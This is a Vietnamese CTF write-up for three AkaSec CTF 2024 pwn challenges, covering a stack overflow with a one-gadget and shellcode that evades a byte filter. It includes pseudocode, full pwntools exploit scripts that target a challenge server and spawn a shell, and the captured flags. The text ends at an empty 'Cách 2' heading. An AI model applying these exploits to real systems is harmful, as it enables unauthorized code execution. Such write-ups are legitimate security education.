---
title: "Write up AkaSec CTF 2024"
---

# Binary exploitation
---
## warmup
> bof + one gadget

Flag: `AKASEC{1_Me44444N_J00_C0ULDve_ju57_574CK_p1V07ed}`

Bài này chủ yếu là sử dụng ROP chain để lấy libc rồi gọi `system()`. Nhưng ở đây mình có thể control `$rsp` ở buffer nên mình sẽ dùng one gadget cho nhanh

### Pseudo:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  helper(argc, argv, envp);
  printf("%p\n", &puts);
  printf("name>> ");
  fgets(name, 512, stdin);
  printf("alright>> ");
  fgets(s, 88, stdin);
  puts("okey");
  return 0;
}
```

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FdN1lmQxT6FkNqi5fM9oQ%252Fimage.png%3Falt%3Dmedia%26token%3Dc9b7f9ea-5c18-47af-8ba6-7d413df432ce&width=768&dpr=1&quality=100&sign=8ffffae2522de4082447e17f589c1b8697e42eb4b3aec39f79e69676d15f2364)

### Checksec:
![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FHiZ2xwWwRQfnvDF3FwRJ%252Fimage.png%3Falt%3Dmedia%26token%3D599d672a-4522-406d-bb5f-df2856072cfd&width=768&dpr=1&quality=100&sign=c232b6d664437e4fc314e1cdfdfa1d87c9eb2de1208b6f1532bc0645e90bc215)

Ta thấy ngay lỗi BOF ở fgets thứ 2, input 88 bytes trong khi biến s chứa có 64.

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FClUwQnF0Hcu13YIHFDtE%252Fimage.png%3Falt%3Dmedia%26token%3D953ecf9e-f06f-4e83-8fb6-7de0a1e1e2e0&width=768&dpr=1&quality=100&sign=11f47acf47c64468a3ad2ed26afa7e2a5432b0fa308884520aa8f176ec401621)

Có 3 điều có thể thấy:
- `$rbp` bị overwrite ở pattern 64
- `$rsp` ở pattern 72
- **Overwrite được tối đa 0xF bytes (fgets đặt null byte ở cuối)**
-> One gadget là rõ

Nhưng kể cả khi có thể ghi đè stack, nếu ko leak được stack thì cũng chả control được các điều kiện để gọi one gadget (như `rbp - 0x50 == NULL` , `rbp - 0xXX` writeable, ...), vậy HOW?
Biến name được khởi tạo rất lơn, và ta có thể write vào nó (No PIE -> địa chỉ ko random). Ta chỉ đơn giản là input 1 bytes bất kì và 511 bytes còn lại ở name sẽ chứa toàn là 0x00 (NULL).

### 1. Leak libc
Ở ngay đầu chương trình, sau hàm `helper()`, nó đã print cho luôn mình địa chỉ **puts** nên ta chỉ cần trừ đi offset là ra libc base:
```py
puts = int(rl()[0:-1], 16)
libc.address = puts - libc.sym.puts
info(f"Libc: {hex(libc.address)}")
```

### 2. BOF
Sau khi input vào biến `name` bằng "XD":

![image](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FJGK9O9RgeCP7yW9iJ1CJ%2Fuploads%2FQsO3bajsHFdvJrhKBTju%2Fimage.png?alt=media&token=4e5abec8-5f6a-46ca-a741-09ef4a7364f1)

![image](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FJGK9O9RgeCP7yW9iJ1CJ%2Fuploads%2FzDnX9Ie30mhZWfc1CltE%2Fimage.png?alt=media&token=6ae1b099-9a48-4904-b92f-47f88048433c)

Tìm gadget:

![image](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FJGK9O9RgeCP7yW9iJ1CJ%2Fuploads%2F9W5PPrJmmd9gppXeNqE6%2Fimage.png?alt=media&token=a08d5dd1-3409-493d-8d56-5b0cec1df15a)

Payload mẫu:

`payload = padding + (*name + 0xXX) + execve gadget`

***XX: bất cứ giá trị nào sao cho `*name + 0xXX == NULL`**

Full payload:
```py
#!/usr/bin/python3

from pwn import *

exe = ELF('warmup_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
ld = ELF('ld-linux-x86-64.so.2', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b*0x0000000000401281

        c
        
        ''')
        input()


if args.REMOTE:
    p = remote('172.210.129.230', 1338)
else:
    p = process(exe.path)
# GDB()

puts = int(rl()[0:-1], 16)
libc.address = puts - libc.sym.puts
info(f"Libc: {hex(libc.address)}")

ru(b">>")
sl(b'A')

ru(b">>")
sl(b'A' * 64 + p64(0x4040c0) + p64(libc.address + 0xef52b))

p.interactive()
```
---
## Good_trip
> shellcode + filter

flag: `AKASEC{y34h_You_C4N7_PRO73C7_5om37hIn9_YoU_doN7_h4V3}`

### Pseudo:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+4h] [rbp-Ch] BYREF
  void *buf; // [rsp+8h] [rbp-8h]

  v4 = 0;
  init(argc, argv, envp);
  buf = mmap((void *)0x1337131369LL, 0x1000uLL, 7, 34, -1, 0LL);
  printf("code size >> ");
  __isoc99_scanf("%d", &v4);
  if ( v4 >= 0x1001 )
    return 0;
  printf("code >> ");
  read(0, buf, 0x999uLL);
  mprotect(buf, (int)v4, 5);
  if ( (unsigned __int8)filter(buf) )
  {
    puts("nop, not happening.");
    exit(-1);
  }
  exec(buf);
  return 0;
}
```
```c
__int64 __fastcall filter(__int64 a1)
{
  void *s1[3]; // [rsp+10h] [rbp-20h]
  int v3; // [rsp+28h] [rbp-8h]
  int v4; // [rsp+2Ch] [rbp-4h]

  v4 = -1;
  s1[0] = &unk_402010;
  s1[1] = &unk_402013;
  s1[2] = &unk_402016;
  while ( ++v4 <= 4093 )
  {
    v3 = -1;
    while ( ++v3 <= 2 )
    {
      if ( !memcmp(s1[v3], (const void *)(v4 + a1), 2uLL) )
        return 1LL;
    }
  }
  return 0LL;
}
```

![image](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FJGK9O9RgeCP7yW9iJ1CJ%2Fuploads%2FJ4FVCVXtdgLn0nvJJCdJ%2Fimage.png?alt=media&token=5143d541-21d3-43ae-9de4-ce4b54c24847)

Flow của chương trình:
`mmap -> input shellcode -> mprotect -> filter -> exec`

nôm na là chương trình sẽ chạy shellcode cho chúng ta thôi

Các thanh ghi sau khi jump đến shellcode:

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FddTPveGqzDG7qURhJrGc%252Fimage.png%3Falt%3Dmedia%26token%3Dc03b3d44-c17b-483a-9a8b-77d388cd7b30&width=768&dpr=1&quality=100&sign=eeea36aae4c2092c3d12fc795282c03aa1c732cf8d70a24031739853d8d2733e)

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FWZwTH1xHofN0UtBYWcsx%252Fimage.png%3Falt%3Dmedia%26token%3Db4e42557-2bd9-4a0f-94c3-f2c57348d876&width=768&dpr=1&quality=100&sign=4d9849642a1110af8b671ab220c6191f074eb5e85f8dc76ee1cc1af2e329b7c0)

**-> Mục tiêu của chúng ta sẽ là syscall đến execve('/bin/sh', NULL, NULL').**

Đầu tiên là nhét `/bin/sh` vào `$rdi`. Vì `$rdi` phải là pointer đến string `binsh` nên ta phải write vào được đâu đó rồi nhét địa chỉ đó vào `$rdi`. Since mmap của ta sau khi qua hàm mprotect thì chỉ còn bit `r-x`.

Để ý là sau khi tạo mmap, nó sẽ có đủ quyển `rwx`, tiếp theo là write shellcode vào, rồi mới gọi `mprotect`. Nên ý tưởng là ta sẽ nhét thằng string `binsh` vào cuối shellcode để chương trình write vào trước khi mprotect.

Syscall thì ở thanh `$r10` có một địa chỉ sus, khá giống hàm nào đó trong libc. Sau khi test trừ đi offset cố định và check vmmap sử dụng gdb thì ra được libc base.

### Shellcode:
```asm
# offset đến binsh phía cuối
mov rdi, rax
add rdi, 0x21

# clear args
xor rdx, rdx
xor rsi, rsi
xor rbx, rbx

# libc syscall
sub r10, 0x16b6e8
mov rax, 0x3b
```

### Payload:
```py
sla(b'>>', b'999') # size
sla(b'>>', shellcode + p64(29400045130965551))
```
---
## Bad_trip
> shellcode again

flag: `AKASEC{pr3f37CH3M_Li8C_4Ddr35532}`

Chal này vẫn giống bài good trip, nhưng có một vài thay đổi

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252Fb2IUy5SMuo6xbSWrJ17s%252Fimage.png%3Falt%3Dmedia%26token%3Da49bb9e7-cb75-4e9c-8d39-1d4f52d5a14e&width=768&dpr=1&quality=100&sign=c6134a02fe364c564af85e2f0726b2c10a28f35abfeecaab622b4926d9ccd955)

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252FBBCYFUYGozaD4Y5pIeKp%252Fimage.png%3Falt%3Dmedia%26token%3D6d068306-6343-4482-8385-f7ec83b2cae4&width=768&dpr=1&quality=100&sign=27ced187a5401f2d07b5ab6b0bf05281e02f1beac12c893cc236fa8e8755ca8c)

- Code vẫn như cũ, chỉ là không cần input length
- Không có libc leak trên thanh ghi
- Có thêm một vùng nhớ mới có thể write data

Lúc đầu chal cho 4 byte cuối của puts, mình tưởng phải gacha 1 byte sau với libc (7fxx..., xx là byte ko biết) lol, nhưng ko cần.

Ở chal này, thanh `$r13` chứa địa chỉ của stack (lúc này đang chứa env?) trước khi jump tới shellcode, nên ta có thể leak được data trên stack bằng cách trừ `$r13` với offset.

![image](https://lunaere-3.gitbook.io/~gitbook/image?url=https%3A%2F%2F3296390032-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FJGK9O9RgeCP7yW9iJ1CJ%252Fuploads%252F8HVjdhEALWNhIb1cjrSy%252Fimage.png%3Falt%3Dmedia%26token%3Dcce56744-bde4-4332-ad60-afcf8db80e88&width=768&dpr=1&quality=100&sign=94d6e994b9d77dc457c57447d5aa62d5b4e8c91149ad4e4ba3fe2fd715c7face)

yup, và gọi `execve('/bin/sh', NULL, NULL)` như chal trước là được

### Fullpayload:

```py
#!/usr/bin/python3

from pwn import *

exe = ELF('bad_trip_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b*exec+71

        c
        vmmap
        ''')
        input()


if args.REMOTE:
    p = remote('172.210.129.230', 1352)
else:
    p = process(exe.path)
GDB()

ru(b'start with ')
libc.address = int(r(10), 16) - libc.sym.puts
info(f"Libc leak: {hex(libc.address)}")

shell = asm('''
    sub r13, 0x68
    mov r13, [r13]
    sub r13, 0x2182d0

    mov r14, r13
    add r14, 0x2646e

    mov r8, 0x6969696500
    mov r9, 29400045130965551
    mov [r8], r9

    mov rdi, r8
    mov rax, 0x3b
    jmp r14
''', arch='amd64')

```

### Cách 2
---
## 
